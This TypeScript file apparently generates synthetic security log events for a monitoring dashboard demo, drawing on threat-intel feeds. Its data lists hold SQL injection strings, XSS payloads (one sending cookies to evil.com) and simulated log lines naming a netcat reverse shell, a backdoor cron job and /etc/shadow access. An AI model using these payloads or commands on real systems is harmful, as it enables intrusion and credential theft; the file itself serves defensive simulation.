import { v4 as uuidv4 } from 'uuid';
import { LogEvent, Severity, EventCategory, GeoInfo } from './types';
import { getThreatData, C2Entry } from './threatIntelFeed';

// ─── Static internal topology ─────────────────────────────────────────────────

const INTERNAL_IPS = [
  '10.0.1.50', '10.0.1.51', '10.0.1.52', '10.0.2.10',
  '10.0.2.11', '192.168.1.100', '192.168.1.101', '172.16.0.5',
];

/**
 * Fallback external IPs used until the threat-intel feed loads its first batch.
 * Entries intentionally overlap with known C2 IPs so geo data is always present.
 */
const STATIC_EXTERNAL: { ip: string; geo: GeoInfo }[] = [
  { ip: '185.220.101.45',  geo: { country: 'Russia',       country_code: 'RU', city: 'Moscow',    lat: 55.75, lon:  37.62 } },
  { ip: '103.214.147.20',  geo: { country: 'China',        country_code: 'CN', city: 'Beijing',   lat: 39.90, lon: 116.40 } },
  { ip: '45.153.160.2',    geo: { country: 'Netherlands',  country_code: 'NL', city: 'Amsterdam', lat: 52.37, lon:   4.90 } },
  { ip: '198.235.24.130',  geo: { country: 'United States',country_code: 'US', city: 'Chicago',   lat: 41.85, lon: -87.65 } },
  { ip: '91.108.4.200',    geo: { country: 'Iran',         country_code: 'IR', city: 'Tehran',    lat: 35.69, lon:  51.42 } },
  { ip: '194.165.16.78',   geo: { country: 'Ukraine',      country_code: 'UA', city: 'Kyiv',      lat: 50.45, lon:  30.52 } },
  { ip: '221.181.185.198', geo: { country: 'China',        country_code: 'CN', city: 'Shanghai',  lat: 31.22, lon: 121.47 } },
  { ip: '77.83.246.53',    geo: { country: 'Germany',      country_code: 'DE', city: 'Frankfurt', lat: 50.11, lon:   8.68 } },
  { ip: '62.233.50.11',    geo: { country: 'Romania',      country_code: 'RO', city: 'Bucharest', lat: 44.43, lon:  26.10 } },
  { ip: '92.118.160.14',   geo: { country: 'Brazil',       country_code: 'BR', city: 'São Paulo', lat:-23.54, lon: -46.63 } },
  { ip: '136.243.154.200', geo: { country: 'Germany',      country_code: 'DE', city: 'Nuremberg', lat: 49.45, lon:  11.08 } },
  { ip: '109.70.100.25',   geo: { country: 'Turkey',       country_code: 'TR', city: 'Istanbul',  lat: 41.01, lon:  28.96 } },
];

const USERS     = ['admin', 'root', 'john.doe', 'jane.smith', 'svc_account', 'backup_user', 'devops', 'guest', 'anonymous'];
const HOSTNAMES = ['web-srv-01', 'db-srv-02', 'auth-srv-01', 'mail-srv-01', 'api-srv-03', 'fileserver-02', 'dc-01', 'proxy-01'];

const SERVICES: Record<number, string> = {
  21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
  80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB',
  1433: 'MSSQL', 3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL',
  6379: 'Redis', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 27017: 'MongoDB',
};

const SQL_PAYLOADS = [
  "' OR 1=1--", "'; DROP TABLE users;--", "UNION SELECT * FROM passwords",
  "1' AND SLEEP(5)--", "admin'--", "' OR 'a'='a",
];

const XSS_PAYLOADS = [
  "<script>alert('xss')</script>", "javascript:alert(1)",
  "<img src=x onerror=alert(1)>", "<svg onload=fetch('//evil.com?c='+document.cookie)>",
];

// ─── Helpers ──────────────────────────────────────────────────────────────────

function pick<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomPort(): number {
  const ports = Object.keys(SERVICES).map(Number);
  return Math.random() < 0.7 ? pick(ports) : randInt(1024, 65535);
}

// ─── Dynamic threat-intel helpers ────────────────────────────────────────────

/** Returns the current external IP pool, merging real C2 IPs with the static set. */
function getExternalPool(): { ip: string; geo: GeoInfo }[] {
  const { c2Ips } = getThreatData();
  const realIps = c2Ips.map((c: C2Entry) => ({ ip: c.ip, geo: c.geo }));
  // Blend: 60% real C2 IPs, 40% static entries for geographic diversity
  if (realIps.length > 0) {
    return [...realIps, ...STATIC_EXTERNAL];
  }
  return STATIC_EXTERNAL;
}

/** Returns a real malware URL (online preferred) or a plausible synthetic one. */
function getRealMalwareUrl(): string {
  const { malwareUrls } = getThreatData();
  const online = malwareUrls.filter(u => u.status === 'online');
  const pool   = online.length > 0 ? online : malwareUrls;
  if (pool.length > 0) {
    // Sanitise: replace real hostname with [REDACTED] for safety in demo context
    const entry = pick(pool);
    try {
      const parsed = new URL(entry.url);
      return `${parsed.protocol}//[REDACTED]${parsed.pathname}`;
    } catch {
      return entry.url;
    }
  }
  return '/malware/payload.bin';
}

/** Returns tags from a random URLhaus malware entry. */
function getMalwareUrlTags(): string[] {
  const { malwareUrls } = getThreatData();
  if (malwareUrls.length === 0) return ['malware', 'download'];
  const entry = pick(malwareUrls);
  return ['web', 'malware-download', ...entry.tags.slice(0, 3)];
}

/** Returns a random real CVE for system/vulnerability events. */
function pickCve(): { id: string; name: string; product: string } {
  const { cves } = getThreatData();
  if (cves.length === 0) return { id: 'CVE-2024-0001', name: 'Unknown Vulnerability', product: 'Unknown' };
  const cve = pick(cves);
  return { id: cve.id, name: cve.name, product: cve.product };
}

/** Picks a real C2 IP (or falls back to a static one) for attack-wave simulations. */
export function pickC2Ip(): string {
  const { c2Ips } = getThreatData();
  const online = c2Ips.filter(c => c.malware !== undefined);
  if (online.length > 0) return pick(online).ip;
  return pick(STATIC_EXTERNAL).ip;
}

// ─── Event generation ─────────────────────────────────────────────────────────

export function generateEvent(forcedSrcIp?: string): LogEvent {
  const category = pick<EventCategory>(['authentication', 'network', 'web', 'system', 'firewall',
    'authentication', 'network', 'web', 'firewall']); // weighted

  const externalPool  = getExternalPool();
  const externalEntry = pick(externalPool);
  const srcIp  = forcedSrcIp ?? (Math.random() < 0.6 ? externalEntry.ip : pick(INTERNAL_IPS));
  const srcGeo = externalPool.find(e => e.ip === srcIp)?.geo;
  const dstIp  = pick(INTERNAL_IPS);
  const dstPort= randomPort();
  const hostname = pick(HOSTNAMES);
  const user   = Math.random() < 0.6 ? pick(USERS) : undefined;
  const now    = new Date().toISOString();

  let severity: Severity = 'info';
  let message  = '';
  let tags: string[] = [];
  let action   = 'allow';
  let statusCode: number | undefined;
  let url: string | undefined;
  let bytes: { sent?: number; received?: number } = {};

  switch (category) {
    case 'authentication': {
      const success = Math.random() > 0.35;
      const proto   = pick(['SSH', 'RDP', 'LDAP', 'Kerberos', 'Web']);
      if (success) {
        severity = Math.random() < 0.1 ? 'medium' : 'info';
        message  = `Successful ${proto} login for user '${user}' from ${srcIp}`;
        action   = 'success';
        tags     = ['auth', 'login-success'];
      } else {
        severity = Math.random() < 0.3 ? 'high' : 'medium';
        message  = `Failed ${proto} authentication for user '${user}' from ${srcIp} - Invalid credentials`;
        action   = 'failure';
        tags     = ['auth', 'login-failure', 'brute-force-indicator'];
      }
      break;
    }

    case 'network': {
      const proto = pick(['TCP', 'UDP', 'ICMP']);
      const flags = pick(['SYN', 'SYN-ACK', 'RST', 'FIN', 'PSH-ACK']);
      // 10% chance: label this as C2 beacon if source is a known C2 IP
      const { c2Ips } = getThreatData();
      const isKnownC2  = c2Ips.some(c => c.ip === srcIp);
      if (isKnownC2) {
        const c2 = c2Ips.find(c => c.ip === srcIp)!;
        severity = 'critical';
        message  = `C2 beacon detected: ${proto} from ${srcIp} (${c2.malware}, AS: ${c2.asName}) to ${dstIp}:${dstPort} [${flags}]`;
        action   = 'block';
        tags     = ['network', 'c2', 'beacon', c2.malware.toLowerCase().replace(/\s+/g, '-')];
      } else {
        severity = Math.random() < 0.2 ? 'medium' : Math.random() < 0.1 ? 'high' : 'info';
        message  = `${proto} connection from ${srcIp}:${randInt(1024, 65535)} to ${dstIp}:${dstPort} [${flags}]`;
        action   = flags === 'RST' ? 'block' : 'allow';
        tags     = ['network', 'connection', proto.toLowerCase()];
        if (dstPort in SERVICES) tags.push(SERVICES[dstPort].toLowerCase());
      }
      bytes = { sent: randInt(64, 65535), received: randInt(64, 65535) };
      break;
    }

    case 'web': {
      const method   = pick(['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS']);
      const hasMalware = Math.random() < 0.12; // 12% chance: use real URLhaus URL
      const hasSql   = !hasMalware && Math.random() < 0.15;
      const hasXss   = !hasMalware && !hasSql && Math.random() < 0.10;
      const paths    = ['/api/users', '/admin/login', '/wp-admin', '/api/data', '/.env',
                        '/etc/passwd', '/api/v1/exec', '/phpmyadmin', '/api/auth/token'];

      statusCode = pick([200, 200, 200, 301, 400, 401, 403, 404, 500, 200]);

      if (hasMalware) {
        url      = getRealMalwareUrl();
        severity = 'critical';
        tags     = getMalwareUrlTags();
        message  = `${method} ${url} HTTP/1.1 ${statusCode} from ${srcIp} [malware download detected]`;
        action   = 'block';
      } else if (hasSql) {
        url      = pick(paths) + `?id=${pick(SQL_PAYLOADS)}`;
        severity = 'critical';
        tags     = ['web', 'sqli', 'injection'];
        message  = `${method} ${url} HTTP/1.1 ${statusCode} from ${srcIp}`;
        action   = 'block';
      } else if (hasXss) {
        url      = pick(paths) + `?q=${pick(XSS_PAYLOADS)}`;
        severity = 'high';
        tags     = ['web', 'xss', 'injection'];
        message  = `${method} ${url} HTTP/1.1 ${statusCode} from ${srcIp}`;
        action   = 'block';
      } else {
        const chosenPath = pick(paths);
        url = chosenPath;
        if (chosenPath.includes('.env') || chosenPath.includes('passwd')) {
          severity = 'high'; tags = ['web', 'recon', 'sensitive-file'];
        } else {
          severity = statusCode >= 500 ? 'medium' : statusCode === 401 || statusCode === 403 ? 'low' : 'info';
          tags = ['web', 'http'];
        }
        message = `${method} ${url} HTTP/1.1 ${statusCode} from ${srcIp}`;
        action  = statusCode >= 400 ? 'block' : 'allow';
      }
      bytes = { sent: randInt(100, 8192), received: randInt(200, 102400) };
      break;
    }

    case 'system': {
      // 20% chance: reference a real CVE from CISA KEV
      const useRealCve = Math.random() < 0.20;
      if (useRealCve) {
        const cve = pickCve();
        severity  = Math.random() < 0.5 ? 'critical' : 'high';
        message   = `Exploitation attempt: ${cve.id} (${cve.product} — ${cve.name}) on ${hostname} by ${user ?? 'unknown'}`;
        tags      = ['system', 'cve', 'exploit', cve.id.toLowerCase()];
        action    = 'detected';
        break;
      }

      const events = [
        { msg: `Process 'nc -e /bin/bash' executed by ${user}`,              sev: 'critical' as Severity, tags: ['system', 'reverse-shell', 'process'] },
        { msg: `sudo privilege escalation by ${user} to root`,               sev: 'high'     as Severity, tags: ['system', 'privilege-escalation', 'sudo'] },
        { msg: `Cron job modified: /etc/cron.d/backdoor added by ${user}`,   sev: 'critical' as Severity, tags: ['system', 'persistence', 'cron'] },
        { msg: `File /etc/shadow accessed by ${user}`,                       sev: 'high'     as Severity, tags: ['system', 'credential-access'] },
        { msg: `SSH key added to /root/.ssh/authorized_keys`,                sev: 'high'     as Severity, tags: ['system', 'persistence', 'ssh'] },
        { msg: `Service 'systemd' restarted on ${hostname}`,                 sev: 'info'     as Severity, tags: ['system', 'service'] },
        { msg: `Package installed: nmap 7.94 by ${user}`,                    sev: 'medium'   as Severity, tags: ['system', 'recon-tool'] },
        { msg: `Firewall rules modified by ${user}`,                         sev: 'medium'   as Severity, tags: ['system', 'firewall-change'] },
      ];
      const ev = pick(events);
      message  = ev.msg;
      severity = ev.sev;
      tags     = ev.tags;
      action   = 'execute';
      break;
    }

    case 'firewall': {
      const blocked = Math.random() > 0.3;
      const proto   = pick(['TCP', 'UDP']);
      severity = blocked
        ? (dstPort === 22 || dstPort === 3389 || dstPort === 1433 ? 'high' : 'medium')
        : 'info';
      message = blocked
        ? `Firewall BLOCKED ${proto} ${srcIp}:${randInt(1024, 65535)} -> ${dstIp}:${dstPort} [${SERVICES[dstPort] ?? 'UNKNOWN'}]`
        : `Firewall ALLOWED ${proto} ${srcIp}:${randInt(1024, 65535)} -> ${dstIp}:${dstPort}`;
      action   = blocked ? 'block' : 'allow';
      tags     = ['firewall', blocked ? 'blocked' : 'allowed', proto.toLowerCase()];
      bytes    = { sent: randInt(64, 1500) };
      break;
    }
  }

  const raw = `${now} ${hostname} ${category.toUpperCase()} ${severity.toUpperCase()} ${message}`;

  return {
    id:               uuidv4(),
    timestamp:        now,
    severity,
    category,
    source_ip:        srcIp,
    destination_ip:   dstIp,
    source_port:      randInt(1024, 65535),
    destination_port: dstPort,
    protocol:         category === 'web' ? 'HTTP/HTTPS' : pick(['TCP', 'UDP']),
    user,
    hostname,
    message,
    raw,
    tags,
    geo:              srcGeo,
    bytes_sent:       bytes.sent,
    bytes_received:   bytes.received,
    status_code:      statusCode,
    url,
    action,
  };
}

export function generateBurst(count: number, srcIp?: string): LogEvent[] {
  return Array.from({ length: count }, () => generateEvent(srcIp));
}
